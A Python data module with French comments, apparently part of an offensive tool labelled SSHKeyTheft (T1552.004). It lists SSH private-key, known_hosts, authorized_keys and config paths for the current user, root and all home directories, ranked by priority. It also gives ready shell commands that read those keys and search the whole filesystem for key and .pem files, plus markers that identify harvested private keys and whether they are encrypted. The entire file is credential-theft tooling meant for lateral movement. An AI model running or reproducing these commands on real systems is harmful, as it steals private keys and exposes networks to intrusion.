#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Sat May 23 2026

@author: hounsousamuel

Helper data pour SSHKeyTheft (T1552.004).
"""

from typing import Dict, Any


# =============================================================================
# TARGETS — fichiers cibles
# =============================================================================

TARGETS: Dict[str, Dict[str, Any]] = {
    "~/.ssh/id_rsa": {
        "description": "Clé privée RSA de l'utilisateur courant",
        "requires_root": False,
        "priority": "critical",
    },
    "~/.ssh/id_ed25519": {
        "description": "Clé privée Ed25519 de l'utilisateur courant",
        "requires_root": False,
        "priority": "critical",
    },
    "~/.ssh/id_ecdsa": {
        "description": "Clé privée ECDSA de l'utilisateur courant",
        "requires_root": False,
        "priority": "critical",
    },
    "~/.ssh/id_dsa": {
        "description": "Clé privée DSA (ancien format, souvent sans passphrase)",
        "requires_root": False,
        "priority": "critical",
    },
    "/root/.ssh/id_rsa": {
        "description": "Clé privée RSA de root",
        "requires_root": True,
        "priority": "critical",
    },
    "/root/.ssh/id_ed25519": {
        "description": "Clé privée Ed25519 de root",
        "requires_root": True,
        "priority": "critical",
    },
    "/root/.ssh/id_ecdsa": {
        "description": "Clé privée ECDSA de root",
        "requires_root": True,
        "priority": "critical",
    },
    "~/.ssh/known_hosts": {
        "description": "Hosts connus — cartographie réseau pour lateral movement",
        "requires_root": False,
        "priority": "high",
    },
    "/root/.ssh/known_hosts": {
        "description": "Hosts connus de root — machines souvent administrées",
        "requires_root": True,
        "priority": "high",
    },
    "~/.ssh/authorized_keys": {
        "description": "Clés publiques autorisées — révèle qui accède à cette machine",
        "requires_root": False,
        "priority": "medium",
    },
    "/root/.ssh/authorized_keys": {
        "description": "Clés publiques autorisées pour root",
        "requires_root": True,
        "priority": "medium",
    },
    "~/.ssh/config": {
        "description": "Config SSH client — hosts configurés avec alias, user, clé associée",
        "requires_root": False,
        "priority": "high",
    },
    "/home/*/.ssh/": {
        "description": "Répertoires SSH de tous les users dans /home/",
        "requires_root": True,
        "priority": "high",
    },
}


# =============================================================================
# COMMANDS — commandes à exécuter
# =============================================================================

COMMANDS: Dict[str, Dict[str, Any]] = {
    # --- Listing des répertoires SSH ---
    "ls -la ~/.ssh/ 2>/dev/null || echo 'SSH_DIR_DENIED'": {
        "description": "Liste le contenu de ~/.ssh/",
        "fail_indicator": "SSH_DIR_DENIED",
        "target": "~/.ssh/",
    },
    "ls -la /root/.ssh/ 2>/dev/null || echo 'ROOT_SSH_DIR_DENIED'": {
        "description": "Liste le contenu de /root/.ssh/",
        "fail_indicator": "ROOT_SSH_DIR_DENIED",
        "target": "/root/.ssh/",
    },

    # --- Clés privées user courant ---
    "cat ~/.ssh/id_rsa 2>/dev/null || echo 'ID_RSA_DENIED'": {
        "description": "Lecture clé privée RSA utilisateur courant",
        "fail_indicator": "ID_RSA_DENIED",
        "target": "~/.ssh/id_rsa",
    },
    "cat ~/.ssh/id_ed25519 2>/dev/null || echo 'ID_ED25519_DENIED'": {
        "description": "Lecture clé privée Ed25519 utilisateur courant",
        "fail_indicator": "ID_ED25519_DENIED",
        "target": "~/.ssh/id_ed25519",
    },
    "cat ~/.ssh/id_ecdsa 2>/dev/null || echo 'ID_ECDSA_DENIED'": {
        "description": "Lecture clé privée ECDSA utilisateur courant",
        "fail_indicator": "ID_ECDSA_DENIED",
        "target": "~/.ssh/id_ecdsa",
    },
    "cat ~/.ssh/id_dsa 2>/dev/null || echo 'ID_DSA_DENIED'": {
        "description": "Lecture clé privée DSA utilisateur courant",
        "fail_indicator": "ID_DSA_DENIED",
        "target": "~/.ssh/id_dsa",
    },

    # --- Clés privées root ---
    "cat /root/.ssh/id_rsa 2>/dev/null || echo 'ROOT_ID_RSA_DENIED'": {
        "description": "Lecture clé privée RSA de root",
        "fail_indicator": "ROOT_ID_RSA_DENIED",
        "target": "/root/.ssh/id_rsa",
    },
    "cat /root/.ssh/id_ed25519 2>/dev/null || echo 'ROOT_ID_ED25519_DENIED'": {
        "description": "Lecture clé privée Ed25519 de root",
        "fail_indicator": "ROOT_ID_ED25519_DENIED",
        "target": "/root/.ssh/id_ed25519",
    },
    "cat /root/.ssh/id_ecdsa 2>/dev/null || echo 'ROOT_ID_ECDSA_DENIED'": {
        "description": "Lecture clé privée ECDSA de root",
        "fail_indicator": "ROOT_ID_ECDSA_DENIED",
        "target": "/root/.ssh/id_ecdsa",
    },

    # --- known_hosts → cartographie réseau ---
    "cat ~/.ssh/known_hosts 2>/dev/null || echo 'KNOWN_HOSTS_DENIED'": {
        "description": "Lecture known_hosts utilisateur — hosts déjà contactés",
        "fail_indicator": "KNOWN_HOSTS_DENIED",
        "target": "~/.ssh/known_hosts",
    },
    "cat /root/.ssh/known_hosts 2>/dev/null || echo 'ROOT_KNOWN_HOSTS_DENIED'": {
        "description": "Lecture known_hosts root — machines souvent administrées",
        "fail_indicator": "ROOT_KNOWN_HOSTS_DENIED",
        "target": "/root/.ssh/known_hosts",
    },

    # --- authorized_keys ---
    "cat ~/.ssh/authorized_keys 2>/dev/null || echo 'AUTHORIZED_KEYS_DENIED'": {
        "description": "Lecture authorized_keys — clés publiques autorisées à se connecter",
        "fail_indicator": "AUTHORIZED_KEYS_DENIED",
        "target": "~/.ssh/authorized_keys",
    },
    "cat /root/.ssh/authorized_keys 2>/dev/null || echo 'ROOT_AUTHORIZED_KEYS_DENIED'": {
        "description": "Lecture authorized_keys root",
        "fail_indicator": "ROOT_AUTHORIZED_KEYS_DENIED",
        "target": "/root/.ssh/authorized_keys",
    },

    # --- SSH config ---
    "cat ~/.ssh/config 2>/dev/null || echo 'SSH_CONFIG_DENIED'": {
        "description": "Lecture config SSH client — alias hosts, users, clés associées",
        "fail_indicator": "SSH_CONFIG_DENIED",
        "target": "~/.ssh/config",
    },

    # --- Recherche globale de clés ---
    "find / -name 'id_rsa' -o -name 'id_ed25519' -o -name 'id_ecdsa' 2>/dev/null | grep -v '/proc\\|/sys\\|/dev' | head -20": {
        "description": "Recherche globale des clés privées SSH sur tout le système",
        "fail_indicator": None,
        "target": None,
    },
    "find / -name '*.pem' -o -name '*.key' 2>/dev/null | grep -v '/proc\\|/sys\\|/dev' | head -20": {
        "description": "Recherche de fichiers .pem et .key (certificats, clés diverses)",
        "fail_indicator": None,
        "target": None,
    },

    # --- Clés dans tous les homes ---
    "for u in $(ls /home/ 2>/dev/null); do echo \"=== $u ===\"; ls /home/$u/.ssh/ 2>/dev/null; cat /home/$u/.ssh/id_rsa 2>/dev/null; cat /home/$u/.ssh/id_ed25519 2>/dev/null; done": {
        "description": "Lecture des clés SSH de tous les users dans /home/",
        "fail_indicator": None,
        "target": "/home/*/.ssh/",
    },
}


# =============================================================================
# PRIVATE KEY MARKERS — pour détecter si un output est une clé privée
# =============================================================================

PRIVATE_KEY_MARKERS: Dict[str, str] = {
    "-----BEGIN RSA PRIVATE KEY-----":     "RSA",
    "-----BEGIN OPENSSH PRIVATE KEY-----": "OpenSSH",
    "-----BEGIN EC PRIVATE KEY-----":      "ECDSA",
    "-----BEGIN DSA PRIVATE KEY-----":     "DSA",
    "-----BEGIN PRIVATE KEY-----":         "PKCS8",
}

# Indicateurs de chiffrement avec passphrase
ENCRYPTION_MARKERS = (
    "ENCRYPTED",
    "Proc-Type: 4,ENCRYPTED",
)